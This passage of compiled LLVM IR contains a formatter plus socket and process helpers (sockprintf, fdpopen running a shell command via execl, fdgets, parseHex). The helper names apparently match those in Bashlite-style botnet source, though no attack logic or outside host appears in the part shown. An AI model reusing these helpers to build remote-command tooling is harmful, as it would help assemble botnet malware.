.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.064.lcssa = phi i32 [ 0, %.preheader ], [ %29, %.critedge.loopexit ]
  %.2.lcssa = phi i8* [ %.1.lcssa, %.preheader ], [ %30, %.critedge.loopexit ]
  %.lcssa = phi i8 [ %19, %.preheader ], [ %31, %.critedge.loopexit ]
  switch i8 %.lcssa, label %138 [
    i8 115, label %33
    i8 100, label %53
    i8 120, label %69
    i8 88, label %85
    i8 117, label %101
    i8 99, label %117
  ]

; <label>:33:                                     ; preds = %.critedge
  %34 = load i32, i32* %5, align 8
  %35 = icmp ult i32 %34, 41
  br i1 %35, label %36, label %41

; <label>:36:                                     ; preds = %33
  %37 = load i8*, i8** %6, align 8
  %38 = sext i32 %34 to i64
  %39 = getelementptr i8, i8* %37, i64 %38
  %40 = add i32 %34, 8
  store i32 %40, i32* %5, align 8
  br label %44

; <label>:41:                                     ; preds = %33
  %42 = load i8*, i8** %7, align 8
  %43 = getelementptr i8, i8* %42, i64 8
  store i8* %43, i8** %7, align 8
  br label %44

; <label>:44:                                     ; preds = %41, %36
  %.in69 = phi i8* [ %39, %36 ], [ %42, %41 ]
  %45 = bitcast i8* %.in69 to i32*
  %46 = load i32, i32* %45, align 4
  %47 = sext i32 %46 to i64
  %48 = inttoptr i64 %47 to i8*
  %49 = icmp ne i32 %46, 0
  %50 = select i1 %49, i8* %48, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.500, i64 0, i64 0)
  %51 = tail call fastcc i32 @prints(i8** %0, i8* %50, i32 %.064.lcssa, i32 %.063.lcssa)
  %52 = add nsw i32 %51, %.061
  br label %138

; <label>:53:                                     ; preds = %.critedge
  %54 = load i32, i32* %5, align 8
  %55 = icmp ult i32 %54, 41
  br i1 %55, label %56, label %61

; <label>:56:                                     ; preds = %53
  %57 = load i8*, i8** %6, align 8
  %58 = sext i32 %54 to i64
  %59 = getelementptr i8, i8* %57, i64 %58
  %60 = add i32 %54, 8
  store i32 %60, i32* %5, align 8
  br label %64

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %7, align 8
  %63 = getelementptr i8, i8* %62, i64 8
  store i8* %63, i8** %7, align 8
  br label %64

; <label>:64:                                     ; preds = %61, %56
  %.in68 = phi i8* [ %59, %56 ], [ %62, %61 ]
  %65 = bitcast i8* %.in68 to i32*
  %66 = load i32, i32* %65, align 4
  %67 = tail call fastcc i32 @printi(i8** %0, i32 %66, i32 10, i32 1, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %68 = add nsw i32 %67, %.061
  br label %138

; <label>:69:                                     ; preds = %.critedge
  %70 = load i32, i32* %5, align 8
  %71 = icmp ult i32 %70, 41
  br i1 %71, label %72, label %77

; <label>:72:                                     ; preds = %69
  %73 = load i8*, i8** %6, align 8
  %74 = sext i32 %70 to i64
  %75 = getelementptr i8, i8* %73, i64 %74
  %76 = add i32 %70, 8
  store i32 %76, i32* %5, align 8
  br label %80

; <label>:77:                                     ; preds = %69
  %78 = load i8*, i8** %7, align 8
  %79 = getelementptr i8, i8* %78, i64 8
  store i8* %79, i8** %7, align 8
  br label %80

; <label>:80:                                     ; preds = %77, %72
  %.in67 = phi i8* [ %75, %72 ], [ %78, %77 ]
  %81 = bitcast i8* %.in67 to i32*
  %82 = load i32, i32* %81, align 4
  %83 = tail call fastcc i32 @printi(i8** %0, i32 %82, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %84 = add nsw i32 %83, %.061
  br label %138

; <label>:85:                                     ; preds = %.critedge
  %86 = load i32, i32* %5, align 8
  %87 = icmp ult i32 %86, 41
  br i1 %87, label %88, label %93

; <label>:88:                                     ; preds = %85
  %89 = load i8*, i8** %6, align 8
  %90 = sext i32 %86 to i64
  %91 = getelementptr i8, i8* %89, i64 %90
  %92 = add i32 %86, 8
  store i32 %92, i32* %5, align 8
  br label %96

; <label>:93:                                     ; preds = %85
  %94 = load i8*, i8** %7, align 8
  %95 = getelementptr i8, i8* %94, i64 8
  store i8* %95, i8** %7, align 8
  br label %96

; <label>:96:                                     ; preds = %93, %88
  %.in66 = phi i8* [ %91, %88 ], [ %94, %93 ]
  %97 = bitcast i8* %.in66 to i32*
  %98 = load i32, i32* %97, align 4
  %99 = tail call fastcc i32 @printi(i8** %0, i32 %98, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 65)
  %100 = add nsw i32 %99, %.061
  br label %138

; <label>:101:                                    ; preds = %.critedge
  %102 = load i32, i32* %5, align 8
  %103 = icmp ult i32 %102, 41
  br i1 %103, label %104, label %109

; <label>:104:                                    ; preds = %101
  %105 = load i8*, i8** %6, align 8
  %106 = sext i32 %102 to i64
  %107 = getelementptr i8, i8* %105, i64 %106
  %108 = add i32 %102, 8
  store i32 %108, i32* %5, align 8
  br label %112

; <label>:109:                                    ; preds = %101
  %110 = load i8*, i8** %7, align 8
  %111 = getelementptr i8, i8* %110, i64 8
  store i8* %111, i8** %7, align 8
  br label %112

; <label>:112:                                    ; preds = %109, %104
  %.in65 = phi i8* [ %107, %104 ], [ %110, %109 ]
  %113 = bitcast i8* %.in65 to i32*
  %114 = load i32, i32* %113, align 4
  %115 = tail call fastcc i32 @printi(i8** %0, i32 %114, i32 10, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %116 = add nsw i32 %115, %.061
  br label %138

; <label>:117:                                    ; preds = %.critedge
  %118 = load i32, i32* %5, align 8
  %119 = icmp ult i32 %118, 41
  br i1 %119, label %120, label %125

; <label>:120:                                    ; preds = %117
  %121 = load i8*, i8** %6, align 8
  %122 = sext i32 %118 to i64
  %123 = getelementptr i8, i8* %121, i64 %122
  %124 = add i32 %118, 8
  store i32 %124, i32* %5, align 8
  br label %128

; <label>:125:                                    ; preds = %117
  %126 = load i8*, i8** %7, align 8
  %127 = getelementptr i8, i8* %126, i64 8
  store i8* %127, i8** %7, align 8
  br label %128

; <label>:128:                                    ; preds = %125, %120
  %.in = phi i8* [ %123, %120 ], [ %126, %125 ]
  %129 = bitcast i8* %.in to i32*
  %130 = load i32, i32* %129, align 4
  %131 = trunc i32 %130 to i8
  store i8 %131, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %132 = call fastcc i32 @prints(i8** %0, i8* nonnull %8, i32 %.064.lcssa, i32 %.063.lcssa)
  %133 = add nsw i32 %132, %.061
  br label %138

; <label>:134:                                    ; preds = %12, %10
  %135 = phi i8 [ %11, %10 ], [ 37, %12 ]
  %.3 = phi i8* [ %.0, %10 ], [ %13, %12 ]
  %136 = zext i8 %135 to i32
  tail call fastcc void @printchar(i8** %0, i32 %136)
  %137 = add nsw i32 %.061, 1
  br label %138

; <label>:138:                                    ; preds = %.critedge, %134, %128, %112, %96, %80, %64, %44
  %.162 = phi i32 [ %137, %134 ], [ %52, %44 ], [ %68, %64 ], [ %84, %80 ], [ %100, %96 ], [ %116, %112 ], [ %133, %128 ], [ %.061, %.critedge ]
  %.4 = phi i8* [ %.3, %134 ], [ %.2.lcssa, %44 ], [ %.2.lcssa, %64 ], [ %.2.lcssa, %80 ], [ %.2.lcssa, %96 ], [ %.2.lcssa, %112 ], [ %.2.lcssa, %128 ], [ %.2.lcssa, %.critedge ]
  %139 = getelementptr inbounds i8, i8* %.4, i64 1
  br label %10

; <label>:140:                                    ; preds = %12, %10
  %141 = icmp eq i8** %0, null
  br i1 %141, label %144, label %142

; <label>:142:                                    ; preds = %140
  %143 = load i8*, i8** %0, align 8
  store i8 0, i8* %143, align 1
  br label %144

; <label>:144:                                    ; preds = %140, %142
  %145 = bitcast %struct.__va_list_tag* %2 to i8*
  tail call void @llvm.va_end(i8* %145)
  ret i32 %.061
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @prints(i8**, i8* nocapture readonly, i32, i32) unnamed_addr #1 {
  %5 = icmp sgt i32 %2, 0
  br i1 %5, label %.preheader37, label %.thread.preheader

.preheader37:                                     ; preds = %4
  %6 = load i8, i8* %1, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge48, label %.lr.ph47.preheader

.lr.ph47.preheader:                               ; preds = %.preheader37
  br label %.lr.ph47

.lr.ph47:                                         ; preds = %.lr.ph47.preheader, %.lr.ph47
  %.046 = phi i8* [ %9, %.lr.ph47 ], [ %1, %.lr.ph47.preheader ]
  %.02745 = phi i32 [ %8, %.lr.ph47 ], [ 0, %.lr.ph47.preheader ]
  %8 = add nuw nsw i32 %.02745, 1
  %9 = getelementptr inbounds i8, i8* %.046, i64 1
  %10 = load i8, i8* %9, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %._crit_edge48.loopexit, label %.lr.ph47

._crit_edge48.loopexit:                           ; preds = %.lr.ph47
  br label %._crit_edge48

._crit_edge48:                                    ; preds = %._crit_edge48.loopexit, %.preheader37
  %.027.lcssa = phi i32 [ 0, %.preheader37 ], [ %8, %._crit_edge48.loopexit ]
  %12 = icmp slt i32 %.027.lcssa, %2
  %13 = sub nsw i32 %2, %.027.lcssa
  %.031 = select i1 %12, i32 %13, i32 0
  %14 = shl i32 %3, 3
  %15 = and i32 %14, 16
  %16 = or i32 %15, 32
  %17 = and i32 %3, 1
  %18 = icmp eq i32 %17, 0
  %19 = icmp sgt i32 %.031, 0
  %or.cond = and i1 %18, %19
  br i1 %or.cond, label %.preheader36.preheader, label %.thread.preheader

.preheader36.preheader:                           ; preds = %._crit_edge48
  br label %.preheader36

.preheader36:                                     ; preds = %.preheader36.preheader, %.preheader36
  %.233 = phi i32 [ %21, %.preheader36 ], [ %13, %.preheader36.preheader ]
  %.029 = phi i32 [ %20, %.preheader36 ], [ 0, %.preheader36.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %16)
  %20 = add nuw nsw i32 %.029, 1
  %21 = add nsw i32 %.233, -1
  %.old1 = icmp sgt i32 %.233, 1
  br i1 %.old1, label %.preheader36, label %.thread.preheader.loopexit

.thread.preheader.loopexit:                       ; preds = %.preheader36
  br label %.thread.preheader

.thread.preheader:                                ; preds = %.thread.preheader.loopexit, %._crit_edge48, %4
  %.02835.ph = phi i32 [ 32, %4 ], [ %16, %._crit_edge48 ], [ %16, %.thread.preheader.loopexit ]
  %.3.ph = phi i32 [ %2, %4 ], [ %.031, %._crit_edge48 ], [ %21, %.thread.preheader.loopexit ]
  %.1.ph = phi i32 [ 0, %4 ], [ 0, %._crit_edge48 ], [ %20, %.thread.preheader.loopexit ]
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %.preheader, label %.thread.preheader65

.thread.preheader65:                              ; preds = %.thread.preheader
  br label %.thread

.preheader.loopexit:                              ; preds = %.thread
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.thread.preheader
  %.1.lcssa = phi i32 [ %.1.ph, %.thread.preheader ], [ %27, %.preheader.loopexit ]
  %24 = icmp sgt i32 %.3.ph, 0
  br i1 %24, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.thread:                                          ; preds = %.thread.preheader65, %.thread
  %25 = phi i8 [ %29, %.thread ], [ %22, %.thread.preheader65 ]
  %.142 = phi i32 [ %27, %.thread ], [ %.1.ph, %.thread.preheader65 ]
  %.03041 = phi i8* [ %28, %.thread ], [ %1, %.thread.preheader65 ]
  %26 = zext i8 %25 to i32
  tail call fastcc void @printchar(i8** %0, i32 %26)
  %27 = add nsw i32 %.142, 1
  %28 = getelementptr inbounds i8, i8* %.03041, i64 1
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %.preheader.loopexit, label %.thread

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.240 = phi i32 [ %31, %.lr.ph ], [ %.1.lcssa, %.lr.ph.preheader ]
  %.439 = phi i32 [ %32, %.lr.ph ], [ %.3.ph, %.lr.ph.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %.02835.ph)
  %31 = add nsw i32 %.240, 1
  %32 = add nsw i32 %.439, -1
  %33 = icmp sgt i32 %.439, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.2.lcssa = phi i32 [ %.1.lcssa, %.preheader ], [ %31, %._crit_edge.loopexit ]
  ret i32 %.2.lcssa
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @printi(i8**, i32, i32, i32, i32, i32, i32) unnamed_addr #1 {
  %8 = alloca [12 x i8], align 1
  %9 = icmp eq i32 %1, 0
  br i1 %9, label %10, label %14

; <label>:10:                                     ; preds = %7
  %11 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 0
  store i8 48, i8* %11, align 1
  %12 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 1
  store i8 0, i8* %12, align 1
  %13 = call fastcc i32 @prints(i8** %0, i8* nonnull %11, i32 %4, i32 %5)
  br label %41

; <label>:14:                                     ; preds = %7
  %15 = icmp ne i32 %3, 0
  %16 = icmp eq i32 %2, 10
  %or.cond = and i1 %16, %15
  %17 = icmp slt i32 %1, 0
  %or.cond3 = and i1 %17, %or.cond
  %18 = sub nsw i32 0, %1
  %19 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 11
  store i8 0, i8* %19, align 1
  %.45 = select i1 %or.cond3, i32 %18, i32 %1
  %20 = icmp eq i32 %.45, 0
  br i1 %20, label %select.unfold._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %14
  %21 = add i32 %6, 198
  br label %select.unfold

select.unfold:                                    ; preds = %.lr.ph, %select.unfold
  %.147 = phi i32 [ %.45, %.lr.ph ], [ %28, %select.unfold ]
  %.03846 = phi i8* [ %19, %.lr.ph ], [ %27, %select.unfold ]
  %22 = urem i32 %.147, %2
  %23 = icmp sgt i32 %22, 9
  %24 = select i1 %23, i32 %21, i32 0
  %.037 = add i32 %22, 48
  %25 = add i32 %.037, %24
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds i8, i8* %.03846, i64 -1
  store i8 %26, i8* %27, align 1
  %28 = udiv i32 %.147, %2
  %29 = icmp ult i32 %.147, %2
  br i1 %29, label %select.unfold._crit_edge.loopexit, label %select.unfold

select.unfold._crit_edge.loopexit:                ; preds = %select.unfold
  br label %select.unfold._crit_edge

select.unfold._crit_edge:                         ; preds = %select.unfold._crit_edge.loopexit, %14
  %.038.lcssa = phi i8* [ %19, %14 ], [ %27, %select.unfold._crit_edge.loopexit ]
  br i1 %or.cond3, label %30, label %38

; <label>:30:                                     ; preds = %select.unfold._crit_edge
  %31 = icmp eq i32 %4, 0
  %32 = and i32 %5, 2
  %33 = icmp eq i32 %32, 0
  %or.cond44 = or i1 %31, %33
  br i1 %or.cond44, label %36, label %34

; <label>:34:                                     ; preds = %30
  tail call fastcc void @printchar(i8** %0, i32 45)
  %35 = add nsw i32 %4, -1
  br label %38

; <label>:36:                                     ; preds = %30
  %37 = getelementptr inbounds i8, i8* %.038.lcssa, i64 -1
  store i8 45, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %select.unfold._crit_edge, %34, %36
  %.041 = phi i32 [ %35, %34 ], [ %4, %36 ], [ %4, %select.unfold._crit_edge ]
  %.139 = phi i8* [ %.038.lcssa, %34 ], [ %37, %36 ], [ %.038.lcssa, %select.unfold._crit_edge ]
  %.035 = phi i32 [ 1, %34 ], [ 0, %36 ], [ 0, %select.unfold._crit_edge ]
  %39 = call fastcc i32 @prints(i8** %0, i8* %.139, i32 %.041, i32 %5)
  %40 = add nsw i32 %39, %.035
  br label %41

; <label>:41:                                     ; preds = %38, %10
  %.040 = phi i32 [ %13, %10 ], [ %40, %38 ]
  ret i32 %.040
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @printchar(i8**, i32) unnamed_addr #1 {
  %3 = alloca i32, align 4
  store i32 %1, i32* %3, align 4
  %4 = icmp eq i8** %0, null
  br i1 %4, label %10, label %5

; <label>:5:                                      ; preds = %2
  %6 = trunc i32 %1 to i8
  %7 = load i8*, i8** %0, align 8
  store i8 %6, i8* %7, align 1
  %8 = load i8*, i8** %0, align 8
  %9 = getelementptr inbounds i8, i8* %8, i64 1
  store i8* %9, i8** %0, align 8
  br label %13

; <label>:10:                                     ; preds = %2
  %11 = bitcast i32* %3 to i8*
  %12 = call i64 @write(i32 1, i8* nonnull %11, i64 1) #5
  br label %13

; <label>:13:                                     ; preds = %10, %5
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #5

declare i64 @write(i32, i8* nocapture readonly, i64) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  %5 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %6 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %6)
  %7 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %5)
  ret i32 %7
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = tail call noalias i8* @malloc(i64 2048) #5
  store i8* %5, i8** %3, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 2048, i32 1, i1 false)
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %7 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %7)
  %8 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %6)
  call void @llvm.va_end(i8* nonnull %7)
  %9 = call i64 @strlen(i8* %5) #15
  %10 = getelementptr inbounds i8, i8* %5, i64 %9
  store i8 10, i8* %10, align 1
  %11 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.34, i64 0, i64 0), i8* %5)
  %12 = call i64 @strlen(i8* %5) #15
  %13 = call i64 @send(i32 %0, i8* %5, i64 %12, i32 16384) #5
  %14 = trunc i64 %13 to i32
  call void @free(i8* %5) #5
  ret i32 %14
}

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #6

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8* nocapture readonly) local_unnamed_addr #1 {
  %3 = alloca [2 x i32], align 4
  %4 = load i8, i8* %1, align 1
  switch i8 %4, label %78 [
    i8 114, label %5
    i8 119, label %5
  ]

; <label>:5:                                      ; preds = %2, %2
  %6 = getelementptr inbounds i8, i8* %1, i64 1
  %7 = load i8, i8* %6, align 1
  %8 = icmp eq i8 %7, 0
  br i1 %8, label %9, label %78

; <label>:9:                                      ; preds = %5
  %10 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 0
  %11 = call i32 @pipe(i32* nonnull %10) #5
  %12 = icmp slt i32 %11, 0
  br i1 %12, label %78, label %13

; <label>:13:                                     ; preds = %9
  %14 = load i32*, i32** @fdopen_pids, align 8
  %15 = icmp eq i32* %14, null
  br i1 %15, label %16, label %26

; <label>:16:                                     ; preds = %13
  %17 = call i32 @getdtablesize() #5
  %18 = icmp slt i32 %17, 1
  br i1 %18, label %78, label %19

; <label>:19:                                     ; preds = %16
  %20 = sext i32 %17 to i64
  %21 = shl nsw i64 %20, 2
  %22 = and i64 %21, 4294967292
  %23 = call noalias i8* @malloc(i64 %22) #5
  store i8* %23, i8** bitcast (i32** @fdopen_pids to i8**), align 8
  %24 = icmp eq i8* %23, null
  br i1 %24, label %78, label %25

; <label>:25:                                     ; preds = %19
  call void @llvm.memset.p0i8.i64(i8* nonnull %23, i8 0, i64 %21, i32 1, i1 false)
  br label %26

; <label>:26:                                     ; preds = %25, %13
  %27 = call i32 @vfork() #16
  switch i32 %27, label %61 [
    i32 -1, label %28
    i32 0, label %34
  ]

; <label>:28:                                     ; preds = %26
  %29 = load i32, i32* %10, align 4
  %30 = call i32 @close(i32 %29) #5
  %31 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %32 = load i32, i32* %31, align 4
  %33 = call i32 @close(i32 %32) #5
  br label %78

; <label>:34:                                     ; preds = %26
  %35 = load i8, i8* %1, align 1
  %36 = icmp eq i8 %35, 114
  br i1 %36, label %37, label %48

; <label>:37:                                     ; preds = %34
  %38 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %39 = load i32, i32* %38, align 4
  %40 = icmp eq i32 %39, 1
  br i1 %40, label %45, label %41

; <label>:41:                                     ; preds = %37
  %42 = call i32 @dup2(i32 %39, i32 1) #5
  %43 = load i32, i32* %38, align 4
  %44 = call i32 @close(i32 %43) #5
  br label %45

; <label>:45:                                     ; preds = %37, %41
  %46 = load i32, i32* %10, align 4
  %47 = call i32 @close(i32 %46) #5
  br label %59

; <label>:48:                                     ; preds = %34
  %49 = load i32, i32* %10, align 4
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %55, label %51

; <label>:51:                                     ; preds = %48
  %52 = call i32 @dup2(i32 %49, i32 0) #5
  %53 = load i32, i32* %10, align 4
  %54 = call i32 @close(i32 %53) #5
  br label %55

; <label>:55:                                     ; preds = %48, %51
  %56 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %57 = load i32, i32* %56, align 4
  %58 = call i32 @close(i32 %57) #5
  br label %59

; <label>:59:                                     ; preds = %55, %45
  %60 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.35, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.36, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.37, i64 0, i64 0), i8* %0, i8* null) #5
  call void @_exit(i32 127) #17
  unreachable

; <label>:61:                                     ; preds = %26
  %62 = load i8, i8* %1, align 1
  %63 = icmp eq i8 %62, 114
  br i1 %63, label %64, label %69

; <label>:64:                                     ; preds = %61
  %65 = load i32, i32* %10, align 4
  %66 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %67 = load i32, i32* %66, align 4
  %68 = call i32 @close(i32 %67) #5
  br label %74

; <label>:69:                                     ; preds = %61
  %70 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %71 = load i32, i32* %70, align 4
  %72 = load i32, i32* %10, align 4
  %73 = call i32 @close(i32 %72) #5
  br label %74

; <label>:74:                                     ; preds = %69, %64
  %.011 = phi i32 [ %65, %64 ], [ %71, %69 ]
  %75 = load i32*, i32** @fdopen_pids, align 8
  %76 = sext i32 %.011 to i64
  %77 = getelementptr inbounds i32, i32* %75, i64 %76
  store i32 %27, i32* %77, align 4
  br label %78

; <label>:78:                                     ; preds = %19, %16, %9, %5, %2, %74, %28
  %.0 = phi i32 [ %.011, %74 ], [ -1, %28 ], [ -1, %2 ], [ -1, %5 ], [ -1, %9 ], [ -1, %16 ], [ -1, %19 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @getdtablesize() local_unnamed_addr #3

; Function Attrs: nounwind returns_twice
declare i32 @vfork() local_unnamed_addr #7

declare i32 @close(i32) local_unnamed_addr #6

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) local_unnamed_addr #3

; Function Attrs: noreturn
declare void @_exit(i32) local_unnamed_addr #8

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) local_unnamed_addr #1 {
  %2 = alloca %struct.__sigset_t, align 8
  %3 = alloca %struct.__sigset_t, align 8
  %4 = alloca i32, align 4
  %5 = load i32*, i32** @fdopen_pids, align 8
  %6 = icmp eq i32* %5, null
  br i1 %6, label %37, label %7

; <label>:7:                                      ; preds = %1
  %8 = sext i32 %0 to i64
  %9 = getelementptr inbounds i32, i32* %5, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %37, label %12

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @close(i32 %0) #5
  %14 = call i32 @sigemptyset(%struct.__sigset_t* nonnull %3) #5
  %15 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 2) #5
  %16 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 3) #5
  %17 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 1) #5
  %18 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* nonnull %3, %struct.__sigset_t* nonnull %2) #5
  br label %19

; <label>:19:                                     ; preds = %25, %12
  %20 = load i32*, i32** @fdopen_pids, align 8
  %21 = getelementptr inbounds i32, i32* %20, i64 %8
  %22 = load i32, i32* %21, align 4
  %23 = call i32 @waitpid(i32 %22, i32* nonnull %4, i32 0) #5
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %25, label %31

; <label>:25:                                     ; preds = %19
  %26 = tail call i32* @__errno_location() #18
  %27 = load i32, i32* %26, align 4
  %28 = icmp eq i32 %27, 4
  br i1 %28, label %19, label %.critedge

.critedge:                                        ; preds = %25
  %29 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #5
  %30 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %30, align 4
  br label %37

; <label>:31:                                     ; preds = %19
  %32 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #5
  %33 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %33, align 4
  %34 = load i32, i32* %4, align 4
  %35 = lshr i32 %34, 8
  %36 = and i32 %35, 255
  br label %37

; <label>:37:                                     ; preds = %.critedge, %31, %1, %7
  %.0 = phi i32 [ -1, %7 ], [ -1, %1 ], [ %36, %31 ], [ -1, %.critedge ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) local_unnamed_addr #3

declare i32 @waitpid(i32, i32*, i32) local_unnamed_addr #6

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #9

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %3
  %5 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %6 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %7 = getelementptr inbounds i8, i8* %6, i64 -1
  %8 = load i8, i8* %7, align 1
  %9 = icmp eq i8 %8, 10
  br i1 %9, label %.critedge.loopexit, label %10

; <label>:10:                                     ; preds = %.lr.ph
  %11 = tail call i64 @read(i32 %2, i8* %6, i64 1) #5
  %12 = trunc i64 %11 to i32
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %13 = icmp eq i32 %12, 1
  %14 = icmp slt i64 %indvars.iv.next, %5
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %10
  %.011.lcssa.ph = phi i32 [ 1, %.lr.ph ], [ %12, %10 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %3
  %.011.lcssa = phi i32 [ 1, %3 ], [ %.011.lcssa.ph, %.critedge.loopexit ]
  %15 = icmp eq i32 %.011.lcssa, 0
  %16 = select i1 %15, i8* null, i8* %0
  ret i8* %16
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #6

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i64 @parseHex(i8* nocapture readonly) local_unnamed_addr #10 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %11, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.05 = phi i64 [ %10, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.034 = phi i8* [ %6, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = shl i64 %.05, 4
  %6 = getelementptr inbounds i8, i8* %.034, i64 1
  %7 = zext i8 %4 to i64
  %8 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %7
  %9 = load i64, i64* %8, align 8
  %10 = or i64 %9, %5
  %11 = load i8, i8* %6, align 1
  %12 = icmp ne i8 %11, 0
  %13 = icmp sgt i64 %10, -1
  %14 = and i1 %13, %12
  br i1 %14, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
